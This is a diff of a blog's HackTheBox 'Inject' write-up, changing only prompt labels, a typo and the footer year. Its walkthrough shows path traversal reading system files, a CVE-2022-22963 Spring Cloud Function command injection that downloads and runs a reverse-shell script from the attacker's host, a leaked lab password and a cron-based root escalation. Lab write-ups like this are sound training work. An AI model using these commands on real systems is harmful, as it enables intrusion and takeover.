@@ -31,10 +31,10 @@
                 </ul>
             </div>
             <div class="writeup-content-main">
-                <div class="highlight"><pre><span></span><span class="n">Machine</span><span class="p">:</span> <span class="n">Inject</span>
-<span class="n">Difficult</span><span class="p">:</span> <span class="n">Easy</span>
-<span class="n">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
-<span class="n">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">3</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2023</span>
+                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Inject</span>
+<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Easy</span>
+<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">3</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2023</span>
 </pre></div>
 <h3><br/>About Inject HTB:</h3><br/>
 This is an easy-level machine in which we exploit a file upload vulnerability to make the page show us how we can access them. The page utilizes a parameter in the GET method to access system files, allowing us to exploit an LFI (Local File Inclusion) using the Directory Path Traversal technique.<br/><br/>
@@ -46,7 +46,7 @@ Subsequently, we proceeded to enumerate the personal directory of the user "phil
 To escalate our privileges to "root", we exploited a cron job by abusing YML extension files and utilized the "ansible-parallel" tool, which is executed at regular intervals.<br/><br/>
 <h3><br>Recon:</br></h3><br>
 Port Scanning:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">vvv</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.129.35.222</span> <span class="o">-</span><span class="n">oG</span> <span class="n">tcpPorts</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">vvv</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.129.35.222</span> <span class="o">-</span><span class="n">oG</span> <span class="n">tcpPorts</span>
 
 
 <span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>    <span class="n">REASON</span>
@@ -55,13 +55,13 @@ Port Scanning:<br/><br/>
 </pre></div>
 
 We conducted a scanning process to identify the technologies and services running on the reported ports. In this case, there are only two open ports, but if there were more open ports, we stored the scan results in a grepable format, enabling us to use regular expressions to filter all the ports and format them appropriately for conducting the scan with nmap.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">cat</span> <span class="n">tcpPorts</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">oP</span> <span class="s1">'\d{1,5}/open'</span> <span class="o">|</span> <span class="n">awk</span> <span class="s1">'{print $1}'</span> <span class="n">FS</span><span class="o">=</span><span class="s2">"/"</span> <span class="o">|</span> <span class="n">xargs</span> <span class="o">|</span> <span class="n">tr</span> <span class="s1">' '</span> <span class="s1">','</span> <span class="o">|</span> <span class="n">tr</span> <span class="o">-</span><span class="n">d</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">cat</span> <span class="n">tcpPorts</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">oP</span> <span class="s1">'\d{1,5}/open'</span> <span class="o">|</span> <span class="n">awk</span> <span class="s1">'{print $1}'</span> <span class="n">FS</span><span class="o">=</span><span class="s2">"/"</span> <span class="o">|</span> <span class="n">xargs</span> <span class="o">|</span> <span class="n">tr</span> <span class="s1">' '</span> <span class="s1">','</span> <span class="o">|</span> <span class="n">tr</span> <span class="o">-</span><span class="n">d</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span>
 
 <span class="mi">22</span><span class="p">,</span><span class="mi">8080</span>
 </pre></div>
 
 Comprehensive scanning of technologies and services running on ports 22 and 8080:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">8080</span> <span class="mf">10.129.35.222</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">8080</span> <span class="mf">10.129.35.222</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
 
 <span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>     <span class="n">VERSION</span>
 <span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>         <span class="n">OpenSSH</span> <span class="mf">8.2</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="mf">.5</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
@@ -86,7 +86,7 @@ Upon further examination of the page, we noticed a section in the upper-right co
 We navigated to that section and noticed that it prompts for file upload.<br/><br/>
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/4.png?raw=true"/><br/><br/>
 I will proceed to create a text file (.txt) with some sample content to verify if it can be uploaded. I will save it in the "Downloads" directory for easy location and quick access.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">echo</span> <span class="s2">"This is an example"</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">test</span><span class="o">.</span><span class="n">txt</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">echo</span> <span class="s2">"This is an example"</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">test</span><span class="o">.</span><span class="n">txt</span>
 </pre></div>
 
 We attempted to upload it:<br/><br/>
@@ -104,7 +104,7 @@ In light of this, we will proceed to test a basic injection technique known as "
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/9.png?raw=true"/><br/><br/>
 We have successfully performed a Directory Path Traversal, and it appears that the file exists. However, due to the limitations of displaying only images, we are unable to view the content of the file in question.<br/><br/>
 Nevertheless, all hope is not lost. We can attempt the same request using the <code>curl</code> tool through the console:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://10.129.35.222:8080/show_image?img=../../../../../../../../../../etc/passwd'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://10.129.35.222:8080/show_image?img=../../../../../../../../../../etc/passwd'</span>
 
 <span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
 <span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
@@ -148,7 +148,7 @@ Nevertheless, all hope is not lost. We can attempt the same request using the <c
 That worked. We have successfully triggered an LFI. Now, we can view files that we should not have access to through the victim machine's website, leveraging this vulnerability.<br/><br/>
 <h3><br>Shell as Frank</br></h3><br>
 After enumerating the system further, we discovered that it utilizes the Spring Framework.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://10.129.35.222:8080/show_image?img=../../../pom.xml'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://10.129.35.222:8080/show_image?img=../../../pom.xml'</span>
 
 <span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="err">?</span><span class="o">&gt;</span>
 <span class="o">&lt;</span><span class="n">project</span> <span class="n">xmlns</span><span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0"</span> <span class="n">xmlns</span><span class="p">:</span><span class="n">xsi</span><span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
@@ -232,7 +232,7 @@ While searching for the CVE on GitHub, we found the following repository:<br/><b
 <a href="https://github.com/me2nuk/CVE-2022-22963">CVE-2022-22963</a><br/><br/>
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/11.png?raw=true"/><br/><br/>
 In this repository, we have found a section that contains a command allowing us to remotely execute commands by making an HTTP request using the POST method, leveraging a Spring Cloud function.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span>  <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.129.35.222</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">functionRouter</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.42/probando")'</span> <span class="o">--</span><span class="n">data</span><span class="o">-</span><span class="n">raw</span> <span class="s1">'data'</span> <span class="o">-</span><span class="n">v</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span>  <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.129.35.222</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">functionRouter</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.42/probando")'</span> <span class="o">--</span><span class="n">data</span><span class="o">-</span><span class="n">raw</span> <span class="s1">'data'</span> <span class="o">-</span><span class="n">v</span>
 </pre></div>
 
 We are attempting to have the machine make a request to our web server using the "curl" command.<br/><br/>
@@ -240,20 +240,20 @@ We are attempting to have the machine make a request to our web server using the
 We observe that the victim machine is making a GET request to our Python-based HTTP server. This indicates that we have successfully achieved remote command execution. Now, the next step is to send a reverse shell. We will proceed to create a file that contains the one-liner bash command to initiate the reverse shell.<br/><br/>
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/13.png?raw=true"/><br/><br/>
 Now we will instruct the server to copy our <code>pwned.sh</code> file and save it in the <code>/tmp</code> directory. Subsequently, we will execute it to receive the shell.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span>  <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.129.35.222</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">functionRouter</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.42/pwned.sh -o /tmp/pwned.sh")'</span> <span class="o">--</span><span class="n">data</span><span class="o">-</span><span class="n">raw</span> <span class="s1">'data'</span> <span class="o">-</span><span class="n">v</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span>  <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.129.35.222</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">functionRouter</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.42/pwned.sh -o /tmp/pwned.sh")'</span> <span class="o">--</span><span class="n">data</span><span class="o">-</span><span class="n">raw</span> <span class="s1">'data'</span> <span class="o">-</span><span class="n">v</span>
 </pre></div>
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/14.png?raw=true"/><br/><br/>
 Now, finally, we will proceed to execute the file that we have stored at the path <code>/tmp/pwned.sh</code>.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span>  <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.129.35.222</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">functionRouter</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/pwned.sh")'</span> <span class="o">--</span><span class="n">data</span><span class="o">-</span><span class="n">raw</span> <span class="s1">'data'</span> <span class="o">-</span><span class="n">v</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span>  <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.129.35.222</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">functionRouter</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/pwned.sh")'</span> <span class="o">--</span><span class="n">data</span><span class="o">-</span><span class="n">raw</span> <span class="s1">'data'</span> <span class="o">-</span><span class="n">v</span>
 </pre></div>
 
 Before executing the file, we need to make sure we are listening on port 443 using the netcat tool.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@parrot</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">nlvp</span> <span class="mi">443</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@parrot</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">nlvp</span> <span class="mi">443</span>
 </pre></div>
 <img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/15.png?raw=true"/><br/><br/>
 <h3><br>Shell as Phil</br></h3><br>
 Upon inspecting the personal directory of the user "Frank," we did not find the user flag. However, we did notice a directory named ".m2." Upon entering this directory, we discovered the "settings.xml" file, which contains credentials.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@frank@inject</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">frank</span><span class="o">/.</span><span class="n">m2</span><span class="o">/</span><span class="n">settings</span><span class="o">.</span><span class="n">xml</span>
+<div class="highlight"><pre><span></span><span class="nd">frank@inject</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">frank</span><span class="o">/.</span><span class="n">m2</span><span class="o">/</span><span class="n">settings</span><span class="o">.</span><span class="n">xml</span>
 <span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="err">?</span><span class="o">&gt;</span>
 <span class="o">&lt;</span><span class="n">settings</span> <span class="n">xmlns</span><span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0"</span> <span class="n">xmlns</span><span class="p">:</span><span class="n">xsi</span><span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
         <span class="n">xsi</span><span class="p">:</span><span class="n">schemaLocation</span><span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span><span class="o">&gt;</span>
@@ -272,16 +272,16 @@ Upon inspecting the personal directory of the user "Frank," we did not find the 
 </pre></div>
 
 We attempted to use these credentials to perform a migration to the user "Phil" and verified that they are correct.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@frank@inject</span><span class="err">$</span> <span class="n">su</span> <span class="n">phil</span>
+<div class="highlight"><pre><span></span><span class="nd">frank@inject</span><span class="err">$</span> <span class="n">su</span> <span class="n">phil</span>
 <span class="n">Password</span><span class="p">:</span> <span class="n">DocPhillovestoInject123</span>
-<span class="nd">@phil@inject</span><span class="err">$</span>
+<span class="nd">phil@inject</span><span class="err">$</span>
 </pre></div>
 <h3><br>Shell as Root</br></h3><br>
 To escalate our privileges, the first step is to check if we have sudoers privileges. However, we did not find any relevant configurations in that regard. Nonetheless, we noticed that as the user "Phil," we belong to the "staff" group and have the ability to modify the contents of the "/opt/automation/tasks" directory.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@phil@inject</span><span class="err">$</span> <span class="nb">id</span> 
+<div class="highlight"><pre><span></span><span class="nd">phil@inject</span><span class="err">$</span> <span class="nb">id</span> 
 <span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">phil</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">phil</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">phil</span><span class="p">),</span><span class="mi">50</span><span class="p">(</span><span class="n">staff</span><span class="p">)</span>
 </pre></div>
-<div class="highlight"><pre><span></span><span class="nd">@phil@inject</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">group</span> <span class="n">staff</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<div class="highlight"><pre><span></span><span class="nd">phil@inject</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">group</span> <span class="n">staff</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
 <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">automation</span><span class="o">/</span><span class="n">tasks</span>
 <span class="o">/</span><span class="n">root</span>
 <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">local</span>
@@ -334,12 +334,12 @@ With this, we can leverage the fact that root executes the tasks to run privileg
 </pre></div>
 
 Next, we will save this content in a file named <code>pwned.yml</code> in the <code>/opt/automation/tasks/</code> directory. After a few minutes, the <code>/bin/bash</code> file will acquire the SUID attribute.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@phil@inject</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<div class="highlight"><pre><span></span><span class="nd">phil@inject</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
 <span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1183448</span> <span class="n">Apr</span> <span class="mi">18</span>  <span class="mi">2022</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
 </pre></div>
 
 Now, all that's left is to execute the command <code>bash -p</code> to obtain a root shell.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@phil@inject</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
+<div class="highlight"><pre><span></span><span class="nd">phil@inject</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="root1">#</span><span class="n"> whoami</span>
 <span class="n">root</span>
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="root1">#</span><span class="n"> cat /root/root.txt</span>
@@ -351,7 +351,7 @@ Now, all that's left is to execute the command <code>bash -p</code> to obtain a 
     </section>
 
     <footer>
-        <p>&copy; 2023 elswix.github.io</p>
+        <p>&copy; 2024 elswix.github.io</p>
     </footer>
 </body>
 </html>
